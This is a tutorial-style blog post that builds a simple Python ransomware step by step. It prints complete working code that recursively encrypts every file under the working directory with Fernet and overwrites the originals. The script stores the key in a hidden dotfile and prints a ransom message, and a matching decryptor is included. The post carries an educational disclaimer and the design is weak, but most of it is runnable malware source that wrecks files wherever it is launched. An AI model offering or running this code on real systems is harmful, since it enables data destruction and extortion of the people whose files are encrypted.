---
title: "The world's most harmless ransomware"
date: 2024-02-23T17:37:37+07:00
tags:
  - programming
  - hacking
  - security
author: "Nam Nguyen"
description: "Let's learn about ransomware by making one"
---

> **Disclaimer**: Please do **NOT** use this for malicious intent. This is purely for educational purpose only. If you do want to run this ransomware, run it in an isolated environment. **STAY SAFE AND DON'T GET IN TROUBLE!**

Ever since I started watching *Mr. Robot*, I got really interested in hacking and hackers. I'm not a hacker myself but I do like learning about how people have found ways to exploit computers.

One type of exploit that caught my eyes is *ransomware*. The idea that a program can just encrypt your computer with all your files and make you pay to get them back is both terrifying and fascinating. 

When I was learning about how ransomware attacks work, I decided to try making a simple (and rather harmless) ransomware myself to understand them better. So let's learn about ransomware by making one!

___

# The concept
A ransomware will encrypt the files on the victim's machine and will decrypt the files once the attacker allows it to (usually after the victim has paid some money).

So we need a way to find all the files on a machine, encrypt them with a key, and then later on, decrypt those files with the same key we used to encrypt them.

___

# The environment
For this project, we will use a cryptography library to be able to encrypt and decrypt the files. I opted for a library called `cryptography` and we can install this by using `pip`.

```bash
pip install cryptography
```

___

# The encryption
So, how do we encrypt all the files on a machine? First of all, we need to find all the files on a machine. To do this, we can use the `os` library. We'll also use the cryptography library we just installed for encryption.

```py
import os
from cryptography.fernet import Fernet
```

We will find all the files and put them into a list called `files`.

We will need to check whether a 'file' is a directory or a file, we can use `os.path.isfile()` to check it. If the 'file' is not a file and is a directory, we can go into that directory recursively find all the files within that directory.

After we're finished with looking through a directory, we can go out of the directory and save the relative path to the file we found.

We also want to avoid our encryption and decryption files along with our key file that will later save our decryption key.

```py
# bill-cipher.py
def find_files():
    files = []
	
	for file in os.listdir():
		if file == "bill-cipher.py" or file == ".a_deal" or file == "bill-decipher.py":
			continue
		
		if os.path.isfile(file):
			files.append(file)
		else:
			os.chdir(file)
			sub_files = find_files()
			os.chdir("..")
			for subfile in sub_files:
				path = file + "/" + subfile
				files.append(path)
			
	return files

files = find_files()
```

Now we need a key to encrypt the files with.

This key will be saved in a file named `.a_deal` because dotfiles will be hidden on Linux systems.

After we generated the key, we want to open all the files, read their contents, encrypt the contents, then write all of the encrypted contents back into the files. 

```py
key = Fernet.generate_key()

with open(".a_deal", "wb") as deal:
	deal.write(key)

for file in files:
	with open(file, "rb") as f:
		content = f.read()

	content_encrypted = Fernet(key).encrypt(content)

	with open(file, "wb") as f:
		f.write(content_encrypted)
```

So the complete encryption program (`bill-cipher.py`) will look something like this:
```py
#!/usr/local/bin/python3 

import os
from cryptography.fernet import Fernet

def find_files():
	files = []
	
	for file in os.listdir():
		if file == "bill-cipher.py" or file == ".a_deal" or file == "bill-decipher.py":
			continue
		
		if os.path.isfile(file):
			files.append(file)
		else:
			os.chdir(file)
			sub_files = find_files()
			os.chdir("..")
			for subfile in sub_files:
				path = file + "/" + subfile
				files.append(path)
			
	return files

files = find_files()

print(files)

key = Fernet.generate_key()

with open(".a_deal", "wb") as deal:
	deal.write(key)

for file in files:
	with open(file, "rb") as f:
		content = f.read()

	content_encrypted = Fernet(key).encrypt(content)

	with open(file, "wb") as f:
		f.write(content_encrypted)

print("Files are encrypted! Send me moneyyyyyyyyyyyyyyy")
```

Now, if we run `bill-cipher.py`, we can see that all the files that this program can get its hand on becomes a jumble of illegible letters.

![file1-encrypted](/img/file1-encrypted.png)

Even the image files become unreadable.

![pic-encrypted](/img/pic-encrypted.png)

So now that we have the files encrypted, we need some way to decrypt it.

___

# The decryption
In order to decrypt it, we need to do the exact same thing as when we encrypted the files but a little different.

Instead of creating a new key, we read the key from `.a_deal` because this is the key that was used to encrypt the files.

```py
with open(".a_deal", "rb") as deal:
	key = deal.read()
```

When we read each of the files, we need to use the key that we read from `.a_deal` to decrypt it instead of encrypting it like we did before.

```py
for file in files:
	with open(file, "rb") as f:
		content = f.read()

	content_decrypted = Fernet(key).decrypt(content)

	with open(file, "wb") as f:
		f.write(content_decrypted)
```

So the complete decryption program (`bill-decipher.py`) will look a bit something like this:

```py
#!/usr/local/bin/python3 

import os
from cryptography.fernet import Fernet

def find_files():
	files = []
	
	for file in os.listdir():
		if file == "bill-cipher.py" or file == ".a_deal" or file == "bill-decipher.py":
			continue
		
		if os.path.isfile(file):
			files.append(file)
		else:
			os.chdir(file)
			sub_files = find_files()
			os.chdir("..")
			for subfile in sub_files:
				path = file + "/" + subfile
				files.append(path)
			
	return files

files = find_files()

print(files)

with open(".a_deal", "rb") as deal:
	key = deal.read()

for file in files:
	with open(file, "rb") as f:
		content = f.read()

	content_decrypted = Fernet(key).decrypt(content)

	with open(file, "wb") as f:
		f.write(content_decrypted)

print("Files decrypted!")
```

And after running this, we can read the content of our files.

![file1-decrypted](/img/file1-decrypted.png)

We can also see our image files.

![pic-decrypted](/img/pic-decrypted.png)

___

# The conclusion
So there we have it, an encryption and decryption program that makes up a ransomware. Of course, this is a very simple and rather harmless ransomware. In fact, if someone is a bit tech savvy, they won't have much trouble decrypting the files. 

But what's at this ransomware's core is also what's at any other ransomware's core, the ability to find and encrypt all the files on the computer and the ability to decrypt them later on.

This is the basic principle that every ransomware operates on.

> You can find the source code for this project [here](https://github.com/namberino/simple-ransomware).
